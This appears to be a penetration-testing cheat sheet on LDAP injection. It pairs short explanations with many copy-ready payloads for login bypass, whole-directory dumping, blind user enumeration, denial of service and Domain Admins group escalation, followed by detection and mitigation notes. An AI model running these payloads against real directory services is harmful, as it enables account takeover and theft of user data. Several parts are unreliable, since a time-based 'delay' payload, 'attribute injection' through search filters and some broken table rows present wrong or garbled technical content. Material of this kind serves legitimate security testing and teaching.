---
title: LDAP Injection
---

# LDAP Injection

**LDAP Injection** is a web application security vulnerability that allows an attacker to manipulate LDAP (Lightweight Directory Access Protocol) queries. This can lead to unauthorized authentication bypass, data exposure, or even full LDAP directory compromise.

---

## Understanding LDAP Basics

- Typical LDAP query
    
    ```
    (filter)(attributes)(scope)
    ```
    
    **Filter**: Logical conditions (e.g., **`(cn=admin)`**)
    
    **Attributes**: Fields to retrieve (e.g., **`cn, mail`**)
    
    **Scope**: Search depth (**`base`**, **`one`**, **`sub`**)
    

- **Base Structure:**
    
    ```
    (attribute=value)
    (&(attribute1=value1)(attribute2=value2))  → AND
    (|(attribute1=value1)(attribute2=value2))  → OR
    (!...)                                      → NOT
    ```
    
- **Common Attributes:**
    - `uid`, `userPassword`, `cn`, `sn`, `mail`, `objectClass`, `ou`, `dn`
- **Fuzzing Payloads:**
    
    ```
    *)(&
    *))(|(
    admin)(&)
    (|(cn=*)
    ```
    

### Requirements

LDAP Injection is generally possible when:

- User input is directly concatenated into LDAP filters.
- Input is not properly escaped or sanitized.
- LDAP search operations use untrusted input.
- The application performs authentication or directory lookups using LDAP.
- Anonymous bind or over-privileged bind accounts are configured.

### LDAP Search Scopes

| Scope | Description |
| --- | --- |
| Base | Search only the specified object |
| One | Search immediate child objects |
| Sub | Search the entire subtree |

---

### Common LDAP Operators

| Operator | Meaning |
| --- | --- |
| `&` | AND |
| ` | ` |
| `!` | NOT |
| `*` | Wildcard |
| `()` | Grouping |

---

## LDAP Injection Attack Surface

- Login Forms
- Search Boxes
- User profile pages
- Email/Directory lookup
- Forgot Password/Reset flows
- Active Directory integrated SSO/LDAP Auth
- Administrative portals
- Employee directory search
- VPN authentication
- User synchronization services
- HR portals
- Group membership queries
- Active Directory management panels

---

## Exploiting LDAP Injection

### 1. **Authentication Bypass**

Assume the query:

```
(&(uid={input})(userPassword={input}))
```

Payloads:

```
*)(&                        // Closes password field, starts new AND group
*)(userPassword=*)          // Wildcard uid + match any password
admin*)(userPassword=*      // Target admin accounts + bypass password
admin)(|(userPassword=*)    // Admin user + OR logic for any password
*)(uid=*))(|(uid=*          // Match any user + break filter with nested OR
```

`These payloads break out of the intended LDAP filter structure by injecting 
operators and wildcards, creating conditions that always evaluate to true and 
bypass authentication without valid credentials.`

Example:

```
Username: admin*)(userPassword=*
Password: anything
```

### 2. **Bypass with Wildcards**

```
*)(cn=*)                    // Break out + match any common name attribute
*(|(mail=*))                // Wildcard + OR logic to match any email
*))                         // Close multiple conditions, match everything
```

`These use wildcards (*) to match any value and break out of the original filter,
returning all LDAP entries or bypassing authentication checks.`

### 3. **Blind Injection Payloads**

Test logical behavior changes:

```
*)(uid=admin))(|(uid=*      // Check if admin exists via OR bypass
*)(uid=admin))(|(uid=*)     // Alternative format for admin check
*)(!(uid=admin))x           // Negation logic - inverts admin condition
```

`If one version allows access while another denies → vulnerable.`

### **4. Denial of Service (DoS)**

Crash LDAP server with complex queries:

```
*)(|(objectClass=*)(cn=*)(ou=*)(dc=*)(sn=*)(givenName=*)(mail=*)(telephoneNumber=*)(&
    // Massive OR chain + unclosed AND - resource exhaustion
(&(objectClass=*)(!(objectClass=void)))
    // Contradictory logic - match all then exclude all
```

### **5. LDAP Attribute Injection**

Modify attributes in LDAP entries:

```
*)(userPassword=HASHED_PASS)(uid=*    // Inject password hash for any user
*)(|(mail=attacker@evil.com)(uid=*    // Change email via OR injection
```

**Example:**

If an application allows profile updates:

```
Original: (&(uid=user)(mail=legit@test.com))
Injected: (&(uid=user)(mail=attacker@evil.com))
```

### 6. Escalating Privileges of a user

Elevate user permissions:

```
Information)(security_level=*))(&(directory=documents
    // Break filter + match any security level
    
Injected Query:
(&(directory=Information)(security_level=*))(&(directory=Information)(security_level=low))
```

### 7. Blind LDAP Injection Techniques

**Payloads:**

```
*)(uid=admin))(|(uid=*      // Boolean: different response = admin exists
*)(!(uid=guest))            // Negation: check if guest is filtered
*)(delay=5000))             // Time-based: response after 5 seconds (like SQL injection)
```

Detection Methods:

- Boolean-based: Observe different responses (access granted/denied, error messages)
- Time-based: Measure response delays to confirm query execution
- Content-based: Analyze differences in returned data or page length

---

## Test Cases

| Scenario | Payload | Expected Outcome |
| --- | --- | --- |
| Bypass Login | `admin*)(userPassword=*` | Authenticated as "admin" |
| Extract all entries | `*)(cn=*)` | Lists all entries |
| Filter manipulation | `*)(uid=*))( | (uid=*` |
| Force true | `*)(uid=*))( | (objectClass=*))` |
| Negate a condition | `*)(!(uid=admin))` | Admin filtered out |
| Break out of original query | `*)(&` or `*) | (` |

---

## LDAP Injection Bypasses & Obfuscation

- **Encoded Payloads:**
    
    ```
    %2A%29%28userPassword%3D%2A
    ```
    
- **Case variations:** `(uID=admin)` instead of `(uid=admin)`
- **Nested filters**:
    
    ```
    (&(uid=admin)(!(uid=*)))
    ```
    
- **Comment Injection**
    
    Using **`\00`** (null byte) to truncate queries.
    
    ```
    admin)(uid=*))\00
    ```
    

### LDAP Escaping

Reserved LDAP characters should be escaped.

| Character | Escape |
| --- | --- |
| `*` | `\2a` |
| `(` | `\28` |
| `)` | `\29` |
| `\` | `\5c` |
| NULL | `\00` |

Example: `admin\2a`

Many applications fail to properly escape these characters, leading to LDAP Injection.

---

## Advance Attack Scenarios

### **1. Nested Logical Operator Abuse**

Attackers inject deeply nested filters to override application logic and force evaluation to **true**.

**Original Query**

```
(&(uid={input})(userPassword={input}))
```

**Advanced Payload**

```
admin)(|(uid=admin)(uid=*))(
```

More complex nesting:

```
*)(|(&(uid=admin)(userPassword=*))(!(uid=admin)))
```

---

### **2. LDAP Query Structure Manipulation (Second-Order Injection)**

Occurs when user input is stored and later reused in another LDAP query.

**Step 1 – Inject Malicious Value During Registration**

```
username: attacker)(|(uid=*))
```

**Step 2 – Application Later Executes**

```
(&(uid=attacker)(|(uid=*)))
```

---

### **3. Active Directory Privilege Escalation**

In environments using **Active Directory**, LDAP injection can target group membership.

Example filter:

```
(&(memberOf=CN=Employees,OU=Groups,DC=corp,DC=local)(uid={input}))
```

**Payload**

```
*)(memberOf=CN=Domain Admins,OU=Groups,DC=corp,DC=local)
```

Advanced group injection:

```
*)(|(memberOf=CN=Domain Admins,OU=Groups,DC=corp,DC=local)(uid=*))
```

---

### **4. Data Exfiltration via Attribute Expansion**

Instead of bypassing login, attacker modifies returned attributes.

Original:

```
(&(uid=user))(cn)
```

Injected:

```
*)(|(uid=*))(userPassword=*)(mail=*)(*)
```

Useful in:

- Directory search forms
- Employee lookup portals
- SSO directory previews

---

### **5. Blind Boolean Enumeration (User Harvesting)**

Attackers enumerate valid usernames using response differences.

Payloads:

```
*)(uid=admin))(|(uid=*
*)(uid=john.doe))(|(uid=*
*)(uid=testuser))(|(uid=*
```

**Method**

- If response differs → user exists
- Repeat iteratively
- Build valid user list
- Later attempt password attacks

---

### **6. Time-Based LDAP Injection (Heavy Query Exploitation)**

LDAP does not support sleep functions like SQL — attackers simulate delay using:

- Extremely complex filters
- Recursive OR chains
- Wildcard-heavy searches

Example:

```
*)(|(cn=*)(cn=*)(cn=*)(cn=*)(cn=*)(cn=*)(cn=*))
```

or

```
(&(objectClass=*)(!(objectClass=nonexistent)))
```

Used for:

- Blind injection confirmation
- Denial-of-Service attacks

---

### **7. LDAP Injection in Password Reset Workflows**

Forgot password filter:

```
(&(mail={input})(uid={input}))
```

Payload:

```
*)(uid=admin)(mail=*)
```

---

### **8. Null Byte Injection for Filter Truncation**

If backend fails to sanitize null bytes:

```
admin)(uid=*))\00
```

---

### **9. Chained Injection with Application Logic Flaws**

LDAP injection combined with:

- Weak access control
- Insecure session handling
- Role-based UI filtering

Example:

```
*)(|(role=admin)(uid=*))
```

If application trusts LDAP result:

- Returns admin role
- Grants elevated UI access
- Privilege escalation achieved

---

### **10. Cross-Protocol Exploitation (LDAP + Kerberos/SSO)**

In enterprise environments using:

- LDAP for directory lookup
- Kerberos for authentication

Injection into LDAP lookup may:

- Force lookup of privileged service accounts
- Leak service principal names (SPNs)
- Assist in lateral movement attacks

---

## Framework-Specific Scenarios

### Java

Common APIs:

- JNDI
- Spring LDAP
- Apache Directory API

---

### .NET

Common APIs:

- System.DirectoryServices
- PrincipalContext
- DirectorySearcher

---

### PHP

Functions:

- ldap_search()
- ldap_bind()

---

### Python

Libraries:

- ldap3
- python-ldap

---

### Node.js

Libraries:

- ldapjs
- activedirectory2

---

## Detection Techniques

### **1. Manual Detection Techniques**

Manual testing focuses on identifying how user input affects LDAP query behavior.

---

### **A. Special Character Injection Testing**

Test inputs containing LDAP control characters:

```
*
)(
&
|!
\00
```

Example payloads:

```
*)(uid=*)
admin)(&
*)(|(uid=*))
```

**Indicators of Vulnerability**

- Authentication bypass
- Different error messages
- Unexpected login success
- Directory search returns excessive results

---

### **B. Boolean-Based Testing**

Inject conditions that alter logical outcomes.

```
*)(uid=admin))(|(uid=*
*)(!(uid=admin))
```

**Observe:**

- Response differences (Login success vs failure)
- Changes in page length
- Error stack traces
- Different HTTP status codes

If logical condition changes response → likely injectable.

---

### **C. Wildcard Enumeration Testing**

Use wildcard expansion to test over-broad queries.

```
*)(cn=*)*)(mail=*)
```

**Signs of Vulnerability**

- Entire directory listing exposed
- Multiple user records returned
- Sensitive attributes displayed

---

### **D. Error-Based Detection**

Trigger malformed filters:

```
*)(
*))(|(
```

**Indicators**

- LDAP syntax error messages
- Stack traces referencing:
    - LDAP filters
    - Directory services
    - Bind/search operations

Error disclosure significantly increases exploitability.

---

### **E. Time/Resource-Based Observation**

Inject heavy queries:

```
*)(|(cn=*)(cn=*)(cn=*)(cn=*))
```

If:

- Response time increases significantly
- Server CPU spikes
- Authentication delays occur

→ Possible blind LDAP injection.

---

### **F. Authentication Logic Testing**

Attempt login bypass:

```
Username: admin*)(userPassword=*Password: anything
```

If login succeeds → confirmed injection vulnerability.

### G. Response Comparison

Compare responses for:

- Status code
- Response body
- Content length
- Redirect behavior
- Authentication state
- Returned LDAP attributes

---

### **Automated Detection Techniques**

Automated tools accelerate identification of LDAP injection vulnerabilities across large applications.

### **A. Proxy-Based Dynamic Scanning**

Use intercepting proxies to fuzz parameters:

- Login forms
- Search fields
- Forgot password flows
- Profile update pages

Test payload lists including:

```
*)(uid=*)*)(|(objectClass=*))
admin)(&
```

Tools automatically analyze:

- Response variations
- Error messages
- Status code changes
- Content length differences

---

### **B. Fuzzing with Payload Libraries**

Use pre-built LDAP payload wordlists.

Effective for:

- Parameter brute forcing
- Blind injection detection
- Attribute discovery

Look for:

- Authentication bypass
- Unexpected data disclosure
- Filter logic manipulation

---

### **C. Automated Security Scanners**

Common tools capable of detecting LDAP Injection:

- **Burp Suite (Active Scanner)**
- **OWASP ZAP**
- **LDAPMiner**
- **Nuclei (custom LDAP templates)**

---

## Impact

- Bypass login and gain unauthorized access to user or administrator accounts.
- Extract sensitive user information such as usernames, emails, and group memberships.
- Enumerate valid accounts for further targeted attacks.
- Escalate privileges to access admin-only areas or restricted functionality.
- Manipulate role or group filters to obtain elevated permissions.
- Execute malformed or complex LDAP queries that exhaust server resources.
- Crash or disrupt LDAP authentication services, causing Denial of Service (DoS).

---

## Tools

- **Burp Suite** (Intruder, Repeater)
- **OWASP ZAP**
- **LDAPMiner** (Automated fuzzing)
- [Softerra LDAP Browser](https://www.ldapadministrator.com/)

---

## **Mitigation & Prevention**

### **Input Validation**

- **Allowlist** (only alphanumeric chars).
- **Block special chars**: **`( ) | & * \00`**

### **Parameterized Queries**

- Use LDAP libraries with escaping:
    - **PHP**: **`ldap_escape()`**
    - **Java**: **`DirContext.search()`**

### **Least Privilege Access**

- Restrict LDAP bind accounts to **read-only**.
- Use **LDAPS (TLS)** instead of plain LDAP.

### **Secure Configurations**

- Disable **anonymous binds**.
- Enforce **rate limiting** to prevent DoS.

---

## Good To Read:

[https://hackerone.com/reports/359290](https://hackerone.com/reports/359290)

[https://ggolawski.github.io/2020/08/06/cve-2020-1958-ldap-injection-druid.html](https://ggolawski.github.io/2020/08/06/cve-2020-1958-ldap-injection-druid.html)

---

## References:

[https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/06-Testing_for_LDAP_Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/06-Testing_for_LDAP_Injection)

[https://www.imperva.com/learn/application-security/ldap-injection/](https://www.imperva.com/learn/application-security/ldap-injection/)

[https://www.brightsec.com/blog/ldap-injection/](https://www.brightsec.com/blog/ldap-injection/)

[https://www.cobalt.io/blog/introduction-to-ldap-injection-attack](https://www.cobalt.io/blog/introduction-to-ldap-injection-attack)

[https://www.invicti.com/blog/web-security/ldap-injection-how-to-prevent/](https://www.invicti.com/blog/web-security/ldap-injection-how-to-prevent/)

[https://www.securew2.com/blog/ldap-injection-attacks-explained](https://www.securew2.com/blog/ldap-injection-attacks-explained)

[https://medium.com/@ibm_ptc_security/ldap-understanding-usage-and-security-implications-9e8a516ab968](https://medium.com/@ibm_ptc_security/ldap-understanding-usage-and-security-implications-9e8a516ab968)

[https://infosecwriteups.com/understanding-ldap-injection-crafting-payloads-and-mitigation-strategies-be90991b7ac8](https://infosecwriteups.com/understanding-ldap-injection-crafting-payloads-and-mitigation-strategies-be90991b7ac8)

[https://book.hacktricks.wiki/en/pentesting-web/ldap-injection.html](https://book.hacktricks.wiki/en/pentesting-web/ldap-injection.html)

[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection)